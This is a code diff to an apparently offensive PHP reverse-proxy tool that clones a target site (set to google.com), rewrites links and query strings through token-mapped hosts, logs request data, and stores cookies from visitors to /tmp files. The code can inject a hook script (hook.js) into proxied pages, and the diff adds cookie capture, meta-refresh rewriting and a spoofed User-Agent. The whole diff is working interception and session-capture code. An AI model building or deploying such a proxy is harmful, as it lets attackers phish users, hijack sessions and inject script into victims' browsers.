@@ -6,13 +6,16 @@
 	// Config settings
 	// URL to redirect to
 	$target = "https://www.google.com"; // Location to save captured cookies
-	$ckfile = '/tmp/cookieFile-' . session_id(); // Location to store URL->token mappings
+	$cookieFile = '/tmp/cookieFile-' . session_id(); // Location to store URL->token mappings
 	$mapFile = '/tmp/mapFile.csv'; // Location to store host mapping
 	$logFile = '/tmp/logFile.csv'; // Location to store request data
 	
 	// Set to TRUE to inject code
-	$inject = TRUE;
+	$inject = FALSE;
 	$evilCode = "http://127.0.0.1/hook.js";
+	
+	// Send fake User-Agent?
+	$sendUA = TRUE;
 
 	function randToken() {
 		return sprintf('%06X', mt_rand(0, 0xFFFFFF));
@@ -62,42 +65,50 @@
 		$DOM = new DOMDocument;
 		if ($DOM->loadHTML($output)) {
 			// Extract scheme and host from current requested URL
-			$parse = parse_url($url);
-			$currentURL = $parse['scheme'] . "://" . $parse['host'];
-			if (array_key_exists($currentURL, $hostMap)) {
-				// If we have a mapping, set baseURL with token
-				$uriToken = $hostMap[$currentURL];
-				$baseURL = $myDomain . "/" . $uriToken;
-			} elseif ($parse['host'] !== $_SERVER['HTTP_HOST']) {
-				$baseURL = $currentURL;
-			}
+			$parsedReqUrl = parse_url($url);
+			$currentHost = $parsedReqUrl['scheme'] . "://" . $parsedReqUrl['host'];
 
-			$attribs = array("src", "href", "action");
-			$tags = $DOM->getElementsByTagName('*');
+			$attribs = array("src", "href", "action", 'content');
+			$elements = $DOM->getElementsByTagName('*');
 
-			foreach ($tags as $tag) {
+			foreach ($elements as $element) {
 				foreach ($attribs as $attrib) {
-					$srcNode = $tag->attributes->getNamedItem($attrib);
+					$srcNode = $element->attributes->getNamedItem($attrib);
 					if ($srcNode) {
-						$oldSrc = $tag->attributes->getNamedItem($attrib)->value;
+						$oldSrc = $element->attributes->getNamedItem($attrib)->value;
+						// If we're dealing with Meta.content, extract URL
+						// Fix this to find redirect attrib then do regex
+						$tagName = $element->nodeName;
+						if (strcasecmp($tagName, "meta") == 0 and preg_match("/(?<=url='|\")[^'|\"]*/i", $oldSrc, $extractedURL)) {
+							$urlString = $extractedURL[0];
+						}
+						else {
+							$urlString = $oldSrc;
+						}
+						
+						// Copy $urlString to modify
+						$modURL = $urlString;
+						
 						// Don't modify evilCode
-						if ($oldSrc !== $evilCode) {
+						if ($modURL !== $evilCode) {
+							$parsedSrc = parse_url($modURL);
 							// First rewrite relative links
-							if (!array_key_exists('host', parse_url($oldSrc))) {
+							if (!array_key_exists('host', $parsedSrc)) {
 								// Standard relative URL
-								if (preg_match("/^\//i", $oldSrc)) {
-									$oldSrc = $baseURL . $oldSrc;
+								if (preg_match("/^\//i", $modURL)) {
+									$modURL = $currentHost . $modURL;
 								} else {
-									$oldSrc = $baseURL . "/" . $oldSrc;
+									$modURL = $currentHost . "/" . $modURL;
 								}
-							} else if (!array_key_exists('scheme', parse_url($oldSrc))) {
+							} else if (!array_key_exists('scheme', $parsedSrc)) {
 								// Protocol relative
-								if (preg_match("/^\/\//i", $oldSrc)) {
-									$oldSrc = parse_url($baseURL)['scheme'] . ":" . $oldSrc;
+								if (preg_match("/^\/\//i", $modURL)) {
+									$modURL = parse_url($currentHost)['scheme'] . ":" . $urlString;
 								}
 							}
+							
 							// Then rewrite absolute URLs
-							$parsedSrc = parse_url($oldSrc);
+							$parsedSrc = parse_url($modURL);
 							if (array_key_exists('host', $parsedSrc)) {
 								// Don't rewrite if it's us
 								if ($parsedSrc['host'] !== $_SERVER['HTTP_HOST']) {
@@ -106,9 +117,10 @@
 									} else {
 										$oldHost = $parsedSrc['host'];
 									}
-									$newHost = checkHostMap($oldHost);
-									$absURL = str_replace($oldHost, $newHost, $oldSrc);
-									$tag->setAttribute($attrib, $absURL);
+									$mappedHost = checkHostMap($oldHost);
+									$newURL = str_replace($oldHost, $mappedHost, $modURL);
+									$newSrc = str_replace($urlString, $newURL, $oldSrc);
+									$element->setAttribute($attrib, $newSrc);
 								}
 							}
 						}
@@ -145,6 +157,42 @@
 		// If not, return the base URL
 		$url = $target . $_SERVER['REQUEST_URI'];
 	}
+	
+	// Is our hostname in request parameter?
+	if (array_key_exists('QUERY_STRING', $_SERVER)) {
+		parse_str($_SERVER['QUERY_STRING'], $parsedQuery);
+		$queryData = array();
+		foreach($parsedQuery as $key => $value) {
+			$myHost = $_SERVER['HTTP_HOST'];
+			preg_match('/(https?:\/\/)(.*)/i', $target, $setTarget);
+			$targetHost = $setTarget[2];
+			if (strstr($value, $myHost)) {
+				$regex1 = '/('. $_SERVER['HTTP_HOST'] . ')(\/)(' . '[a-zA-Z0-9]{6})/';
+				if (preg_match($regex1, $value, $matches)) {
+					// Does it appear to contain a token?
+					$uriHostAndToken = $matches[0];
+					$uriHost = $matches[1];
+					$uriToken = $matches[3];
+					if (in_array($uriToken, $hostMap, true)) {
+						// Do we have a mapping for this token?
+						preg_match('/(https?:\/\/)(.*)/', array_search($uriToken, $hostMap), $mappedHost);
+						$value = str_replace($uriHostAndToken, $mappedHost[2], $value);
+					}
+					else {
+						// If no mapping found our regex may have failed, replace host with current target
+						$value = str_replace($_SERVER['HTTP_HOST'], $setTarget[2], $value);
+					}
+				} else {
+					// If not, just replace host with current target
+					$value = str_replace($_SERVER['HTTP_HOST'], $setTarget[2], $value);
+				}
+			}
+			$queryData[$key] = $value;
+			
+		}
+		$queryString = http_build_query($queryData);
+		$url = str_replace($_SERVER['QUERY_STRING'], $queryString, $url);
+	}
 
 	// Is this an SSL request?
 	if (array_key_exists('HTTPS', $_SERVER) && $_SERVER["HTTPS"] === "on") {
@@ -180,6 +228,27 @@
 	if (array_key_exists('HTTP_REFERER', $_SERVER)) {
 		curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
 	}
+	// Set User-Agent
+	if ($sendUA) {
+		if (array_key_exists('HTTP_USER_AGENT', $_SERVER)) {
+			//curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+			curl_setopt($ch, CURLOPT_USERAGENT, "proxyClone");
+			
+		}
+	}
+	
+	// Do we have any cookies?
+	// These should only be client side cookies - hackish fix
+	if (array_key_exists('HTTP_COOKIE', $_SERVER)) {
+		$incomingCookies = explode(';', $_SERVER['HTTP_COOKIE']);
+		foreach ($incomingCookies as $cookie) {
+			$extractedCookie = explode('=', $cookie, 2);
+			if ($extractedCookie[0] != "PHPSESSID" and $extractedCookie[1] != session_id()) {
+				$cookieEntry = ".google.com	TRUE	/	FALSE	0	" . $extractedCookie[0] . "\t" . $extractedCookie[1] . PHP_EOL;
+				file_put_contents($cookieFile, $cookieEntry, FILE_APPEND | LOCK_EX,null);
+			}
+		}
+	}
 
 	curl_setopt($ch, CURLOPT_URL, $url);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -187,8 +256,8 @@
 	curl_setopt($ch, CURLOPT_HEADER, 1);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 	curl_setopt($ch, CURLINFO_HEADER_OUT, true);
-	curl_setopt($ch, CURLOPT_COOKIEJAR,  $ckfile);
-	curl_setopt($ch, CURLOPT_COOKIEFILE, $ckfile);
+	curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookieFile);
+	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
 	$curlResponse = curl_exec($ch);
 
 	// Check that a connection was made
@@ -212,7 +281,7 @@
 					$newHost = checkHostMap($oldHost);
 					$value = str_replace($oldHost, $newHost, $value);
 				}
-				if (preg_match("/^Content-Type/i", $value)) {
+				if (preg_match("/^Content-Type/", $value)) {
 					if (preg_match("/text\/html/i", $value)) {
 						if ($inject) {
 							$body = injectCode($body);
